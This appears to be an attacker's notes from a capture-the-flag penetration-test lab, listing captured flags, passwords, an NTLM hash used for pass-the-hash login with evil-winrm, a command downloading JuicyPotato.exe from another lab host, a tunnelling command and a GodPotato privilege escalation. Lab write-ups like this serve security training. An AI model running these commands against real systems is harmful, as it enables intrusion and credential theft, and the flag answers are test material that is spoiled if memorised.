# Information
- CTF Name: 
- CTF Level:
- CTF Description: 
- Date: 
- Platform: 
- Category: 

# Findings
### Credentials
` dante123,Pass123,Pass123!,password,test,123`

-> for access : `evil-winrm -i 172.16.1.102 -u Administrator -H c55ed3c3d34c4576bcd33c76420be934`

### Flag
1. `DANTE{U_M4y_Kiss_Th3_Br1d3}`
2. `DANTE{D0nt_M3ss_With_MinatoTW}`

## External
### Enumeration
![](https://i.imgur.com/VOTf0lS.png)
https://www.nmmapper.com/st/exploitdetails/48552/42799/online-marriage-registration-system-10-remote-code-execution/
![](https://i.imgur.com/9ZZxoZL.png)
### Gaining Access
![](https://i.imgur.com/47B8ZqC.png)
![](https://i.imgur.com/4OcjmEX.png)
## Internal
### Enumeration
```
define('DB_HOST','localhost');
define('DB_USER','root');
define('DB_PASS','Welcome1!');
define('DB_NAME','omrsdb');


iwr -uri http://172.16.1.100:9090/JuicyPotato.exe -outfile potato.exe

client 172.16.1.100:8008 R:3306:127.0.0.1:3306 

GodPotato -cmd "cmd /c type C:\Users\Administrator\Desktop\flag.txt"

�����͹ PowerShell events - script block logs (EID 4104) - searching for sensitive data.

   User Id         :        S-1-5-21-3089243881-3525850343-252262830-500
   Event Id        :        4104
   Context         :        if ($null -ne $password) {
}
WhatIf = $check_mode
ConvertTo-SecureString -String $password -AsPlainText -Force
}
Try {
Expand-Archive -Path $src @expand_params
   Created At      :        7/18/2022 10:24:22 PM
   Command line    :        ConvertTo-SecureString -String $password -AsPlainText -Force

   =================================================================================================

   User Id         :        S-1-5-21-3089243881-3525850343-252262830-500
   Event Id        :        4104
   Context         :        if ($null -ne $username) {
$credential = $null
}
ConvertTo-SecureString -String $password -AsPlainText -Force
$credential = New-Object -TypeName PSCredential -ArgumentList $username, $secPassword
}
# This must be set after the module spec so the validate-modules sanity-test can get the arg spec.
   Created At      :        7/18/2022 10:21:45 PM
   Command line    :        ConvertTo-SecureString -String $password -AsPlainText -Force

   =================================================================================================

   User Id         :        S-1-5-21-3089243881-3525850343-252262830-500
   Event Id        :        4104
   Context         :        if ($null -ne $username) {
$credential = $null
}
ConvertTo-SecureString -String $password -AsPlainText -Force
$credential = New-Object -TypeName PSCredential -ArgumentList $username, $secPassword
}
# This must be set after the module spec so the validate-modules sanity-test can get the arg spec.
   Created At      :        7/18/2022 10:21:29 PM
   Command line    :        ConvertTo-SecureString -String $password -AsPlainText -Force
```
### Gaining Access
![](https://i.imgur.com/9fNOswL.png)
![](https://i.imgur.com/4M5qOBL.png)


### Maintaining Access


# Random Notes